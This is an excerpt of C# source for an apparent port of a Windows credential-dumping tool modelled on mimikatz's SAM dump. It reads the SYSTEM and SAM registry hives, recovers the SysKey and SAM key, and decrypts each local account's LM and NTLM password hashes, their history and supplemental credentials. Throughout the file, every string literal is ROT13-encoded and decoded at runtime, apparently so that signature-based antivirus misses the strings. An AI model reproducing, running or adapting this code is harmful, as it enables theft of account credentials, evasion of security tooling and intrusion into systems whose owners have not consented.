...
namespace ldump_rot13.Module
{
    class Sam
    {
        ...
        static string[] SYSKEY_NAMES = { "JD", new string("Fxrj1".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("TOT".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("Qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) };
        ...
        static string[] CONTROLSET_SOURCES = new string[] { new string("Pheerag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("Qrsnhyg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) };
        ...
        public static bool LsadumpSam(string system, string sam)
        {
            ...
            if (sysKey != IntPtr.Zero)
            {
                ...
                else Console.WriteLine(new string("PerngrSvyr (FNZ uvir)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        ...
        private static bool GetUsersAndSamKey(IntPtr hRegistry, IntPtr hSAMBase, IntPtr sysKey)
        {
            ...
            if (OpenAndQueryWithAlloc(hRegistry, hSAMBase, new string("FNZ\\Qbznvaf\\Nppbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), "V", ref restype, ref pData, out szUser))
            {
                Console.Write(new string("[*] Ybpny FVQ : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                Natives.ConvertSidToStringSid(IntPtr.Add(pData, (int)(szUser - (Marshal.SizeOf(typeof(SID)) + sizeof(uint) * 3))), out string sid);
                Console.WriteLine(sid);
            }

            IntPtr hAccount = RegOpenKeyEx(hRegistry, hSAMBase, new string("FNZ\\Qbznvaf\\Nppbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), 0, (ACCESS_MASK)KEY_READ);
            if (hAccount != IntPtr.Zero)
            {
                ...
                {
                    hUsers = RegOpenKeyEx(hRegistry, hAccount, new string("Hfref".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), 0, (ACCESS_MASK)KEY_READ);
                            ...
                            if (user != IntPtr.Zero)
                            {
                                for (int i = 0; i < nbSubKeys; i++)
                                {
                                    ...
                                    if (RegEnumKeyEx(hRegistry, hUsers, (uint)i, user, pszUser, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                                    {
                                        ...
                                        if (!tmp.Equals(new string("Anzrf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                                        {
                                            ...
                                            if (rid != 0)
                                            {
                                                ...
                                                if (status =(hUser != IntPtr.Zero) )
                                                {
                                                    ...
                                                    {
                                                        int pluto = Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                                        UAv = (USER_ACCOUNT_V)Marshal.PtrToStructure(pUAv, typeof(USER_ACCOUNT_V));
                                                        UAv.datas = UpdateDataBytes(pUAv, Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), (int)needed - (Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))));
                                                        ...
                                                        GetHash(pLMHash, IntPtr.Add(pUAv, Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))), pSamKey, rid, false, false);
                                                        GetHash(pNTLMHash, IntPtr.Add(pUAv, Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))), pSamKey, rid, true, false);
                                                        GetHash(pLMHistory, IntPtr.Add(pUAv, Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))), pSamKey, rid, false, true);
                                                        GetHash(pNTLMHistory, IntPtr.Add(pUAv, Utility.FieldOffset<USER_ACCOUNT_V>(new string("qngnf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))), pSamKey, rid, true, true);
                                                    }
                ...
                else Console.WriteLine(new string("TrgFnzXrl XB".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                RegCloseKey(hRegistry, hAccount);
            }
            else Console.WriteLine(new string("ErtBcraXrlRk FNZ Nppbhagf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        ...
        private static bool GetSamKey(IntPtr hRegistry, IntPtr hAccount, IntPtr sysKey, IntPtr samKey)
        {
            ...
            Console.Write(new string("[*] FNZXrl : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                        ...
                        switch (domAccF.keys1.Revision)
                        {
                            case 1:
                                ...
                                if (!(status = ((NTSTATUS)Natives.RtlEncryptDecryptRC4(ref data, ref key) == NTSTATUS.Success)))
                                    Console.WriteLine(new string("EgyQrpelcgQngn2 XB".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                break;
                            case 2:
                                IntPtr pAesKey = IntPtr.Add(pDomAccF,Utility.FieldOffset<DOMAIN_ACCOUNT_F>(new string("xrlf1".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())));
                                AesKey = (SAM_KEY_DATA_AES)Marshal.PtrToStructure(pAesKey, typeof(SAM_KEY_DATA_AES));
                                AesKey.data = UpdateDataBytes(pAesKey, Utility.FieldOffset<SAM_KEY_DATA_AES>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), (int)AesKey.DataLen);
                                ...
                                break;
                            default:
                                Console.WriteLine(new string("Haxabj Fgehpg Xrl erivfvba (%h)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), domAccF.keys1.Revision);
                                break;
                        }
                        break;
                    default:
                        Console.WriteLine(new string("Haxabj S erivfvba (%uh)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), domAccF.Revision);
                        break;
                }
            }
            else Console.WriteLine(new string("xhyy_z_ertvfgel_BcraNaqDhrelJvguNyybp XB".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    ...
                    if (pKn.nbSubKeys > 0 && (dwIndex < pKn.nbSubKeys) && (pKn.offsetSubKeys != -1))
                    {
                        ...
                        switch (pHbC.tag)
                        {
                            ...
                            case 26732:
                                ...
                                pLfLh.elements = UpdateDataREGISTRY_HIVE_LF_LH_ELEMENT(IntPtr.Add(registryHive.pStartOf, pKn.offsetSubKeys), Utility.FieldOffset<KULL_M_REGISTRY_HIVE_LF_LH>(new string("ryrzragf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), pLfLh.nbElements);
                                if (pLfLh.nbElements > 0 && (dwIndex < pLfLh.nbElements))
                                {
                                    ...
                                    pCandidateKn.keyName = UpdateDataBytes(IntPtr.Add(registryHive.pStartOf, pLfLh.elements[dwIndex].offsetNamedKey), Utility.FieldOffset<KULL_M_REGISTRY_HIVE_KEY_NAMED>(new string("xrlAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), pCandidateKn.szKeyName);
        ...
        private static bool GetSupplementalCreds(IntPtr hRegistry, IntPtr hUser, ref byte[] samKey)
        {
            ...
            if (RegQueryValueEx(hRegistry, hUser, new string("FhccyrzragnyPerqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), IntPtr.Zero, ref restype, ref nope, ref szNeeded))
            {
                int offset = Utility.FieldOffset<KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS>(new string("rapelcgrq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                if (szNeeded > (offset + AES_BLOCK_SIZE + 96)) 
                {
                    IntPtr pEncCreds = Marshal.AllocHGlobal((int)szNeeded);
                    if (pEncCreds != IntPtr.Zero)
                    {
                        if (RegQueryValueEx(hRegistry, hUser, new string("FhccyrzragnyPerqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), IntPtr.Zero, ref restype, ref pEncCreds, ref szNeeded))
                        {
                            int offset2 = Utility.FieldOffset<USER_PROPERTIES>(new string("Erfreirq4".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            ...
                            encCreds.encrypted = UpdateDataBytes(pEncCreds, Utility.FieldOffset<KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS>(new string("rapelcgrq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), (int)(szNeeded - offset));
                            ...
                            if (pProperties != IntPtr.Zero)
                            {
                                ...
                                if (GenericAes128.kull_m_crypto_genericAES128Decrypt(psamkey, piv, penc, (uint)(szNeeded - offset), ref data, ref properties.Length))
                                {
                                    if (properties.Length == encCreds.originalSize)
                                    {
                                        ...
                                        Marshal.Copy(mydata,0, (IntPtr.Add(pProperties,Utility.FieldOffset<USER_PROPERTIES>(new string("Erfreirq4".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))), (int)properties.Length);
                        ...
                        else Console.WriteLine(new string("xhyy_z_ertvfgel_ErtDhrelInyhrRk(qngn)\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    }
                }
            }
            return status;
        ...
        {
            IntPtr p = RegOpenKeyEx(hRegistry, hSystemBase, new string("Fryrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), 0, (Natives.ACCESS_MASK)KEY_READ);
            ...
            if (p != IntPtr.Zero)
            {
                ...
                Console.Write(new string("[*] Qbznva : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                uint lptype = 0;
                IntPtr pcomputerName = IntPtr.Zero;
                uint needed = 0;

                if(OpenAndQueryWithAlloc(hRegistry, result, new string("Pbageby\\PbzchgreAnzr\\PbzchgreAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("PbzchgreAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), ref lptype, ref pcomputerName, out needed))
                {
                ...
                Console.Write(new string("[*] FlfXrl : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                IntPtr hComputerNameOrLSA = RegOpenKeyEx(hRegistry, result, new string("Pbageby\\YFN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), 0, (Natives.ACCESS_MASK)KEY_READ);
                if (hComputerNameOrLSA != IntPtr.Zero)
                {
                    ...
                    {
                        result = IntPtr.Zero;
                        Console.WriteLine(new string("TrgFlfxrl XB\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    }
                ...
                {
                    result = IntPtr.Zero;
                    Console.WriteLine(new string("ErtBcraXrlRk YFN XB\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                }
        ...
        private static KULL_M_REGISTRY_HIVE_BIN_CELL_DATA GetBinCell(IntPtr pRegistryHive, int offset, int size)
        {
            ...
            c.data = UpdateDataBytes(IntPtr.Add(registryHive.pStartOf, offset), Utility.FieldOffset<KULL_M_REGISTRY_HIVE_BIN_CELL_DATA>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())),size);
            return c;
        }
        private static IntPtr SearchValueNameInList(IntPtr hRegistry, IntPtr hKey, string lpValueName)
        {
            ...
            if (pKn.tag == 27502)
            {
                if (pKn.nbValues != 0 && pKn.offsetValues != -1)
                {
                    ...
                    pVl.offsetValue = UpdateDataInt(IntPtr.Add(registryHive.pStartOf, pKn.offsetValues), Utility.FieldOffset<KULL_M_REGISTRY_HIVE_VALUE_LIST>(new string("bssfrgInyhr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), (int)pKn.nbValues);
                    for (int i = 0; i < pKn.nbValues; i++)
                    {
                        ...
                        pVk.valueName = UpdateDataBytes(cp, Utility.FieldOffset<KULL_M_REGISTRY_HIVE_VALUE_KEY>(new string("inyhrAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), pVk.szValueName);
                        if (pVk.tag == 27510)
                        {
        ...
        private static bool OpenAndQueryWithAlloc(IntPtr hRegistry, IntPtr hKey, string lpSubKey, string lpValueName, ref uint lpType, ref IntPtr lpData, out uint szNeeded)
        {
            ...
            else Console.WriteLine(new string("ErtBcraXrlRk XB".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            return false;
        }
        ...
        private static bool QueryWithAlloc(IntPtr hRegistry, IntPtr hKey, string lpValueName, ref uint lpType, ref IntPtr lpData, ref uint szNeeded)
        {
            ...
            if (RegQueryValueEx(hRegistry, hKey, lpValueName, IntPtr.Zero, ref lpType, ref nope, ref szNeeded))
            {
                if (szNeeded != 0)
                {
                    ...
                    {
                        Console.WriteLine(new string("ErtDhrelInyhrRk XB".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    }

                }
            }
            else Console.WriteLine(new string("Orsber ErtDhrelInyhrRk XB".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            return false;
        }
        ...
        private static bool GetSyskey(IntPtr hRegistry, IntPtr hLSA, ref byte[] sysKey)
        {
            ...
            for (int i = 0; (i < SYSKEY_NAMES.Length); i++)
            {
                ...
                else Console.WriteLine(new string("YFN Xrl Pynff ernq reebe".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            }
        ...
        private static IntPtr SearchKeyNamedInList(KULL_M_REGISTRY_HANDLE registry, IntPtr pHbC, string lpSubKey)
        {
            ...
            switch (hbC.tag)
            {
                ...
                case 26732:
                    ...
                    pLfLh.elements = UpdateDataREGISTRY_HIVE_LF_LH_ELEMENT(pHbC, Utility.FieldOffset<KULL_M_REGISTRY_HIVE_LF_LH>(new string("ryrzragf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), pLfLh.nbElements);
                    ...
                    for (int i = 0; i < pLfLh.nbElements; i++)
                    {
                        ...
                        pKn.keyName = UpdateDataBytes(IntPtr.Add(registryHive.pStartOf, pLfLh.elements[i].offsetNamedKey), Utility.FieldOffset<KULL_M_REGISTRY_HIVE_KEY_NAMED>(new string("xrlAnzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())),pKn.szKeyName);
                        if (pKn.tag == 27502)
                        {
        ...
        {
            string lsadump_NTPASSWORD = "NTPASSWORD";
            string lsadump_LMPASSWORD;
            string lsadump_NTPASSWORDHISTORY;
            string lsadump_LMPASSWORDHISTORY;
            lsadump_LMPASSWORD = new string("YZCNFFJBEQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            lsadump_NTPASSWORDHISTORY = new string("AGCNFFJBEQUVFGBEL".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            lsadump_LMPASSWORDHISTORY = new string("YZCNFFJBEQUVFGBEL".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            bool status = false;
            ...
            pHash.data = UpdateDataBytes(IntPtr.Add(pStartOfData, (int)samentry.offset),Utility.FieldOffset<SAM_HASH>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())),(int)samentry.lenght - Utility.FieldOffset<SAM_HASH>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())));
            ...
            if (samentry.offset > 0 && samentry.lenght > 0)
            {
                switch (pHash.Revision)
                {
                    case 1:
                        if (samentry.lenght >= Marshal.SizeOf(typeof(SAM_HASH)))
                        {
                            ...
                            cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = samentry.lenght - (uint)Utility.FieldOffset<SAM_HASH>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            ...
                            if (cypheredHashBuffer.Buffer != IntPtr.Zero)
                            {
                                ...
                                if (!(status = ((NTSTATUS)Natives.RtlEncryptDecryptRC4(ref cypheredHashBuffer, ref keyBuffer)== NTSTATUS.Success)))
                                    Console.WriteLine(new string("EgyQrpelcgQngn2".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            }
                        }
                        break;
                    case 2:
                        pHashAes = (SAM_HASH_AES)Marshal.PtrToStructure(IntPtr.Add(pStartOfData, (int)samentry.offset), typeof(SAM_HASH_AES));
                        pHashAes.data = UpdateDataBytes(IntPtr.Add(pStartOfData, (int)samentry.offset), Utility.FieldOffset<SAM_HASH_AES>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), (int)samentry.lenght - Utility.FieldOffset<SAM_HASH_AES>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())));
                        if (pHashAes.dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
                        {
                            ...
                            if (GenericAes128.kull_m_crypto_genericAES128Decrypt(samKey, psalt, IntPtr.Add(pStartOfData, (int)samentry.offset + Utility.FieldOffset<SAM_HASH_AES>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))), samentry.lenght - (uint)Utility.FieldOffset<SAM_HASH_AES>(new string("qngn".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())), ref output, ref len))
                            {
                        ...
                        break;
                    default:
                        Console.WriteLine(new string("Haxabj FNZ_UNFU erivfvba (%uh)\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), pHash.Revision);
                        break;
                }
                if (status)
                {
                ...
                if (status)
